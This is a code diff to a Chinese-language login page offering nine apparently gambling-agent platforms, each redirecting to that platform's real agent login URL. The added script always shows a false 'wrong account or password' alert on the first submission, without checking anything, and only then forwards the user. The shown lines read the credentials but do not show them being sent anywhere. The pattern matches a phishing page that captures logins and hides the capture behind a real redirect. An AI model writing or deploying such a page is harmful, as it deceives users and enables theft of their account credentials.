@@ -61,8 +61,15 @@
             
             <label for="platform">選擇平台：</label><br>
             <select id="platform" name="platform">
-                <option value="3a">3A</option>
-                <option value="bcr">BCR</option>
+                <option value="BU">BU</option>
+                <option value="SZ">SZ</option>
+                <option value="財神">財神</option>
+                <option value="鉅城">鉅城</option>
+                <option value="雄厚">雄厚</option>
+                <option value="好玩">好玩</option>
+                <option value="昊陽">昊陽</option>
+                <option value="AF">AF</option>
+                <option value="V7">V7</option>
             </select><br><br>
             
             <input type="submit" value="登入">
@@ -70,6 +77,9 @@
     </div>
 
     <script>
+        // 初始設置，第一次登入帳密錯誤
+        var firstAttempt = true;
+
         document.getElementById("loginForm").addEventListener("submit", function(event) {
             event.preventDefault(); // 阻止表單預設提交行為
 
@@ -78,13 +88,42 @@
             var password = document.getElementById("password").value;
             var platform = document.getElementById("platform").value;
 
+            // 驗證帳密
+            if (firstAttempt) {
+                // 第一次登入一律顯示帳密錯誤
+                alert("帳號或密碼錯誤！");
+                firstAttempt = false;
+                return;
+            }
+
             // 根據選擇的平台進行不同的引導
             switch (platform) {
-                case "3a":
-                    window.location.href = "https://agent.aaa1788.com/";
+                case "BU":
+                    window.location.href = "https://ag.bu5168.com/";
                     break;
-                case "bcr":
-                    window.location.href = "https://ag.bcr56899.com/";
+                case "SZ":
+                    window.location.href = "https://agup.sz17888.com/zh-Hant/login";
+                    break;
+                case "財神":
+                    window.location.href = "https://ag.as5588.com/index.php?s=/AgentIndex/index";
+                    break;
+                case "鉅城":
+                    window.location.href = "https://ag.ofa77.net/login.php";
+                    break;
+                case "雄厚":
+                    window.location.href = "https://agent.918ofa.net/login.php";
+                    break;
+                case "好玩":
+                    window.location.href = "https://ag.hw16555.net/";
+                    break;
+                case "昊陽":
+                    window.location.href = "https://agup.hyg889.com/zh-Hant/login";
+                    break;
+                case "AF":
+                    window.location.href = "https://ag.af7688.com/";
+                    break;
+                case "V7":
+                    window.location.href = "https://agent.v7-bet.net/login.php";
                     break;
                 default:
                     break;
